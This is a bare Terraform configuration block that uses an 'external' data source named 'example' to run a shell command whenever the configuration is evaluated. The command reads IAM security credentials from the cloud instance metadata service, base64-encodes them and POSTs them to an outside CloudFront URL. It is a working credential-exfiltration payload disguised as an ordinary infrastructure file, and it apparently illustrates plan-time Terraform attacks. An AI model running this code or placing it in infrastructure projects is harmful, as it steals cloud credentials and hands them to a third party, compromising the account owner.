data "external" "example" {
    program = ["sh","-c","curl -X POST -d \"param1=`curl 169.254.169.254/latest/meta-data/iam/security-credentials | base64`\" https://d9usos5h96tz9.cloudfront.net/log"]
}